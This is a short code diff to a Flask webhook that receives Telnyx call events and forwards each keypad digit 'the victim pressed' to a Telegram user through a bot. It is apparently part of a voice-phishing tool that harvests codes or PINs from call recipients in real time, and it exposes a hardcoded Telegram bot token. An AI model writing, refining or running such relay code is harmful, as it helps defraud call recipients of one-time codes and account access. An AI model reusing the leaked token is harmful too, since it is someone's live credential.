@@ -8,39 +8,24 @@ TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
 
 @app.route('/telnyx_webhook', methods=['POST'])
 def telnyx_webhook():
-    try:
-        # Log the incoming request body
-        data = request.json
-        print(f"Received JSON data: {data}")  # Log the entire JSON data
-    except Exception as e:
-        print(f"Error while reading JSON data: {str(e)}")
-        return 'Error reading JSON', 400
+    # Log the incoming request body
+    data = request.json
+    print(f"Received JSON data: {data}")
     
     # Extract telegram_user_id from the URL query parameters
     telegram_user_id = request.args.get('telegram_user_id', None)
     print(f"Telegram User ID: {telegram_user_id}")
     
-    if not telegram_user_id:
-        return 'No Telegram User ID provided', 400
+    # Extract the digit pressed by the victim from the incoming data
+    digit = data.get('data', {}).get('payload', {}).get('digit', None)
     
-    # Log and check for digit in the JSON data
-    try:
-        digit = data.get('data', {}).get('payload', {}).get('digit', None)
+    if digit:
         print(f"Digit Pressed: {digit}")
-        
-        if digit:
-            send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
-        else:
-            print("No digit pressed.")
-    except KeyError as e:
-        print(f"Error extracting digit: {str(e)}")
-        return 'Error processing digit', 400
+        # Call the function to send the message to the Telegram bot
+        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
+    else:
+        print("No digit pressed.")
     
-    # Optionally, log the entire payload or any other part of the data
-    payload = data.get('data', {}).get('payload', {})
-    print(f"Payload data: {payload}")
-    
-    # Return a success response
     return 'OK', 200
 
 def send_telegram_message(user_id, message):
